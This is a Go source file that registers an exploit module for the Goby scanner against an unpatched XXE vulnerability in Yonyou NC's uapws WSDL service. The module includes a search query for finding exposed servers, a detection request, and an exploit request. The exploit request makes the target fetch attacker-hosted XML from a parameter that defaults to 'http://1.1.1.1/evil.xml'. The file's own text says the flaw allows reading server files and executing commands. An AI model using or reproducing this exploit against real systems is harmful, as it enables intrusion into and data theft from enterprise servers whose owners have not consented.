package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyon NC uapws wsdl XXE Vulnerability",
    "Description": "<p>Yonyou NC digital platform for large enterprises, deep application of the new generation of digital intelligence technology, to create an open, interconnected, integrated, intelligent integration platform, focusing on the digital intelligent management, digital intelligent operation, digital intelligent business three major enterprises digital intelligent transformation strategic direction, Provide 18 solutions covering digital marketing, financial sharing, global Treasury, intelligent manufacturing, agile supply chain, talent management, intelligent collaboration, etc., to help large enterprises to fully implement digital intelligence.</p><p>UFIDA NC system uapws has a WSDL interface, which can pass the specified path into the internal or external XML for parsing, causing xxE vulnerability. An attacker can read server files and execute arbitrary commands through XXE vulnerability.</p>",
    "Impact": "Yonyon NC uapws wsdl XXE Vulnerability",
    "Recommendation": "<p>At present, the official has not released a security patch, please pay attention to the manufacturer's update.<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "Product": "Yonyou NC",
    "VulType": [
        "XML External Entity Injection"
    ],
    "Tags": [
        "XML External Entity Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "用友 NC系统 uapws wsdl XXE 漏洞",
            "Description": "<p>用友NC 大型企业数字化平台，深度应用新一代数字智能技术，打造开放、互联、融合、智能的一体化平台，聚焦数智化管理、数智化经营、数智化商业等三大企业数智化转型战略方向，提供涵盖数字营销、财务共享、全球司库、智能制造、敏捷供应链、人才管理、智慧协同等18大解决方案，帮助大型企业全面落地数智化。<br></p><p>用友 NC 系统 uapws 存在 wsdl 接口，可通过指定路径传入内部或外部的 xml 进行解析，造成 XXE 漏洞。攻击者可以通过 XXE 漏洞读取服务器文件，执行任意命令等。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友 NC 系统 uapws 存在 wsdl 接口，可通过指定路径传入内部或外部的 xml 进行解析，造成 XXE 漏洞。攻击者可以通过 XXE 漏洞读取服务器文件，执行任意命令等。</span><br></p>",
            "Recommendation": "<p>目前官方尚未发布安全补丁，请关注厂商更新。<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a><br></p>",
            "Product": "用友-NC",
            "VulType": [
                "XML外部实体注入"
            ],
            "Tags": [
                "XML外部实体注入"
            ]
        },
        "EN": {
            "Name": "Yonyon NC uapws wsdl XXE Vulnerability",
            "Description": "<p>Yonyou NC digital platform for large enterprises, deep application of the new generation of digital intelligence technology, to create an open, interconnected, integrated, intelligent integration platform, focusing on the digital intelligent management, digital intelligent operation, digital intelligent business three major enterprises digital intelligent transformation strategic direction, Provide 18 solutions covering digital marketing, financial sharing, global Treasury, intelligent manufacturing, agile supply chain, talent management, intelligent collaboration, etc., to help large enterprises to fully implement digital intelligence.<br></p><p><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">UFIDA NC system uapws has a WSDL interface, which can pass the specified path into the internal or external XML for parsing, causing xxE vulnerability.</span><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">&nbsp;An attacker can read server files and execute arbitrary commands through XXE vulnerability.</span><br></p>",
            "Impact": "Yonyon NC uapws wsdl XXE Vulnerability",
            "Recommendation": "<p>At present, the official has not released a security patch, please pay attention to the manufacturer's update.<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a><br></p>",
            "Product": "Yonyou NC",
            "VulType": [
                "XML External Entity Injection"
            ],
            "Tags": [
                "XML External Entity Injection"
            ]
        }
    },
    "FofaQuery": "body=\"/Client/Uclient/UClient.dmg\"",
    "GobyQuery": "body=\"/Client/Uclient/UClient.dmg\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://yonyou.com/",
    "DisclosureDate": "2022-04-15",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/uapws/service/nc.uap.oba.update.IUpdateService?wsdl",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Type: text/xml;",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml version='1.0' encoding='UTF-8'?>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "?xsd=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/uapws/service/nc.uap.oba.update.IUpdateService?xsd={{{xmlUrl}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "xmlUrl",
            "type": "input",
            "value": "http://1.1.1.1/evil.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "7089"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
